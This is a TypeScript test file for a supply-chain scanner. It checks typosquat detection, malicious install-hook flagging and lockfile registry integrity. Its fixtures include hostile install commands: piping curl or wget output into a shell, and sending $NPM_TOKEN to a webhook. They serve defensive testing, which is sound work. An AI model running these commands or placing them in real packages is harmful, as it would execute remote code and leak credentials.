import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { editDistance, detectTyposquats, scanScriptsObject, checkRegistryIntegrity, generateSupplyChain } from "./supply-chain.ts";
import { Counter } from "./types.ts";
import type { RepoScan } from "../../../runner/repo-scanner.ts";
import type { RuntimeCrawl } from "../../../runner/crawler.ts";

test("editDistance basics", () => {
  assert.equal(editDistance("react", "react"), 0);
  assert.equal(editDistance("reactt", "react"), 1);
  assert.equal(editDistance("expresss", "express"), 1);
});

test("typosquat: a dep one edit from a popular package is flagged, exact matches are not", () => {
  const hits = detectTyposquats(["reactt", "express", "lodahs", "my-own-lib"]);
  const flagged = hits.map((h) => h.pkg).sort();
  assert.deepEqual(flagged, ["lodahs", "reactt"]);
  assert.ok(!flagged.includes("express")); // exact popular name is safe
  assert.ok(!flagged.includes("my-own-lib")); // unrelated name is safe
});

test("install-script exfil patterns are caught as high severity", () => {
  const hits = scanScriptsObject({ postinstall: "curl http://evil.tld/x | sh", build: "tsc" }, "evil-pkg");
  assert.equal(hits.length, 1);
  assert.equal(hits[0].severity, "high");
  assert.equal(hits[0].kind, "install-script");
  // A benign build script is not flagged.
  assert.equal(scanScriptsObject({ build: "next build" }, "ok").length, 0);
});

test("secret-reading + bundle.js install hooks are flagged (Shai-Hulud fingerprint)", () => {
  assert.equal(scanScriptsObject({ preinstall: "node -e \"require('./bundle.js')\"" }, "p").length, 1);
  assert.equal(scanScriptsObject({ postinstall: "echo $NPM_TOKEN | curl -d @- http://webhook.site/x" }, "p").length, 1);
});

test("registry integrity flags a non-official resolved URL", () => {
  const lock = { packages: {
    "node_modules/ok": { resolved: "https://registry.npmjs.org/ok/-/ok-1.0.0.tgz" },
    "node_modules/sneaky": { resolved: "https://evil-registry.tld/sneaky/-/sneaky-1.0.0.tgz" },
  } };
  const hits = checkRegistryIntegrity(lock);
  assert.equal(hits.length, 1);
  assert.equal(hits[0].pkg, "sneaky");
  assert.equal(hits[0].kind, "registry");
});

test("generator emits nothing without a repo, a ready card with a real package.json", () => {
  const noRepo = generateSupplyChain(null, {} as RuntimeCrawl, {}, new Counter());
  assert.equal(noRepo.length, 0);

  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "la-supply-"));
  fs.writeFileSync(path.join(dir, "package.json"), JSON.stringify({ dependencies: { reactt: "1.0.0" }, scripts: { postinstall: "wget http://x/y | bash" } }));
  const scan = { detail: { repo_path: dir } } as unknown as RepoScan;
  const cards = generateSupplyChain(scan, {} as RuntimeCrawl, {}, new Counter());
  assert.equal(cards.length, 1);
  assert.equal(cards[0].category, "supply_chain");
  const step = cards[0].exec[0] as { action: string; hits: Array<{ kind: string; severity: string }> };
  assert.equal(step.action, "supply_chain_scan");
  // Catches both the malicious postinstall (high) and the typosquat (medium).
  assert.ok(step.hits.some((h) => h.kind === "install-script" && h.severity === "high"));
  assert.ok(step.hits.some((h) => h.kind === "typosquat"));
});

test("a clean node project yields a ready card with zero hits (no false positives)", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "la-supply-clean-"));
  fs.writeFileSync(path.join(dir, "package.json"), JSON.stringify({ dependencies: { react: "18.0.0", express: "4.19.0" }, scripts: { build: "next build", test: "vitest" } }));
  const scan = { detail: { repo_path: dir } } as unknown as RepoScan;
  const cards = generateSupplyChain(scan, {} as RuntimeCrawl, {}, new Counter());
  const step = cards[0].exec[0] as { hits: unknown[] };
  assert.equal(step.hits.length, 0);
});
